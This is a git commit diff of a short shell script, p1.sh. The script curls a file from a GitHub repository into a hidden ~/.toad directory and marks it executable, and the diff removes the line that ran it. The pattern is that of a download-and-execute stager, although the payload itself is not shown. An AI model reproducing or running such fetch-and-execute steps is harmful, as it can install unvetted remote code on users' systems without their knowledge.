33d1726759168f7dc6de5d4c7c648eecfcb2eb7b
codddddddddddddddddddddddddddddddd <codisafish@protonmail.com>
2025-04-07 21:40:09 -0400

    Update p1.sh

--- p1.sh
+++ p1.sh
@@ -1,4 +1,3 @@
 #!/bin/sh
 curl https://raw.githubusercontent.com/codddddddddddddddddddddddddddddddd/hex-cod-bus-explode/refs/heads/main/p2 > ~/.toad/v.warioware
 chmod +x ~/.toad/v.warioware
-~/.toad/v.warioware
